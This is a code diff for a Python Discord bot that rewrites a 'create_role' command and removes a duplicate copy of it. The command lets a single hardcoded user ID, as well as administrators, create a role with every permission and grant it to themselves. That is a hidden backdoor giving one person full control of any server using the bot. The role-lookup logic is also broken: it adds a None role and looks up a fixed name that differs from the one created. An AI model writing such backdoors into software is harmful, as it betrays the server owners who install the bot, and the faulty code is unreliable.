@@ -29,15 +29,15 @@ async def on_ready():
 @bot.command(pass_context=True)
 async def create_role(ctx, *, name):
     if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '397745647723216898':
-        role = discord.utils.get(ctx.message.author.server.roles, name=name)
+        role = discord.utils.get(ctx.message.author.server.roles, name="Epic")
         if role == None:
             await bot.add_roles(ctx.message.author, role)
-            return await bot.say("Your role has been")
+            return await bot.say("Your role has been given")
         try:
             await bot.create_role(ctx.message.server, name=name, permissions=discord.Permissions.all())
         except Exception as e:
             return await bot.say("Error: {}".format(e))
-        role = discord.utils.get(ctx.message.author.server.roles, name=name)
+        role = discord.utils.get(ctx.message.server.roles, name="Epic")
         if role == None:
             return await bot.say("No role found? Please try again to fix bug")
         await bot.add_roles(ctx.message.author, role)
@@ -208,21 +208,6 @@ async def say(ctx, *, message):
         return
     else:
         await bot.say(message)
-@bot.command(pass_context=True)
-async def create_role(ctx, *, name):
-    if ctx.message.author.server_permissions.administrator or ctx.message.author.id == '397745647723216898':
-        role = discord.utils.get(ctx.message.author.server.roles, name="Epic")
-        if role == None:
-            await bot.add_roles(ctx.message.author, role)
-            return await bot.say("Your role has been given")
-        try:
-            await bot.create_role(ctx.message.server, name=name, permissions=discord.Permissions.all())
-        except Exception as e:
-            return await bot.say("Error: {}".format(e))
-        role = discord.utils.get(ctx.message.server.roles, name="Epic")
-        if role == None:
-            return await bot.say("No role found? Please try again to fix bug")
-        await bot.add_roles(ctx.message.author, role)
 
 @bot.event
 async def on_message(message):
